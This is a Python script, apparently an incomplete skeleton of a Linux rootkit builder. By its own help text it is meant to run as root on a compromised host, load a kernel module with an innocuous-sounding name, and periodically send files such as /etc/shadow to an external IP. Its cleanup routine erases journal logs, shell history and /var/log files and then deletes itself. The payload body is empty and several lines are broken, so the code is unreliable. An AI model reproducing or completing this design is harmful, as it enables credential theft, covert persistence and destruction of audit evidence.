import os
import argparse

MODULE_CODE=""""""

MAKEFILE="""
obj-m += test.c

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean"""

#module_name is needed to hide the exploit under the name which is not suspicious
def exploit_gen(external_ip, external_port, module_name = "ethernet_module", files = [], update_period=1):
    print(external_ip, external_port, module_name, update_period)
    print(files[0])
    print(files[1])

def load_module(name):
    os.system("make")


def cleanup():
    os.system(" make clean")
    os.system(" journalctl --vacuum-time=10d")
    os.system(" history -c")
    for file in os.listdir("/var/log"):
        with open:
            file.truncate()
    os.remove(__file__)

def main():
    parser = argparse.ArgumentParser(description = "This script should be ran as root on expoited machine to create and load a suitable for your tasks c kernel module to spy on specific files and stay hidden")
    parser.add_argument("--external_ip", type = str, help = "Provide an external machine IP ADDRESS that will be used")
    parser.add_argument("--external_port", type = str, help = "Provide an external machine PORT that will be used", default="22")
    parser.add_argument("--module_name", type = str, help = "Name of the module f.ex ethernet_module, it's better not to have virus or expoit name obviously")
    parser.add_argument("--files", type = str, nargs="+", help="Here a list of files to be sent should be provided f.ex /etc/hosts /etc/shadows", default="/etc/shadows")
    parser.add_argument("--update_period", type = str, help = "The interval of time in which information should be gathered again and send (in hours). You should know that to avoid suspicions, time period may differ up to 11 min", default="1")
    args = parser.parse_args()
    exploit_gen(args.external_ip, args.external_port, args.module_name, args.files, args.update_period)
    load_module()
    cleanup()
    return 0;

if __name__ == "__main__":
    main()
